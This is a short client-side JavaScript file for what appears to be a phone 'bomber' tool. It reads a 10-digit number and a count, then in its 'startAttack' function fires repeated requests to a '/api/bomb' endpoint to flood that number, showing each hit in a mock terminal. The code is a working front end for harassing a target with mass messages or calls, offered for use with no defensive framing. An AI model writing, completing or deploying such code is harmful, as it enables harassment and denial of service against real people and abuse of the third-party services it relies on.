let phone, count;

function nextStep(step) {
    if(step === 2) {
        phone = document.getElementById('phone').value;
        if(phone.length !== 10) return alert("Enter 10 digits!");
    }
    if(step === 3) {
        count = document.getElementById('count').value;
        if(count <= 0) return alert("Enter valid count!");
    }
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(`step-${step}`).classList.add('active');
}

async function startAttack(delay) {
    nextStep(4);
    const terminal = document.getElementById('terminal');
    let s_count = 0, f_count = 0;

    for(let i = 0; i < count; i++) {
        try {
            const res = await fetch(`/api/bomb?number=${phone}&index=${i}`);
            const data = await res.json();
            
            if(data.status === "success") {
                s_count++;
                terminal.innerHTML += `<p class="success">> [REQ ${i+1}] SUCCESS: ${data.name}</p>`;
            } else {
                f_count++;
                terminal.innerHTML += `<p class="failed">> [REQ ${i+1}] FAILED: ${data.name}</p>`;
            }
        } catch (e) {
            f_count++;
            terminal.innerHTML += `<p class="failed">> [REQ ${i+1}] CONNECTION ERROR</p>`;
        }
        
        document.getElementById('s-count').innerText = s_count;
        document.getElementById('f-count').innerText = f_count;
        terminal.scrollTop = terminal.scrollHeight;
        
        if(delay > 0) await new Promise(r => setTimeout(r, 1000));
    }
}
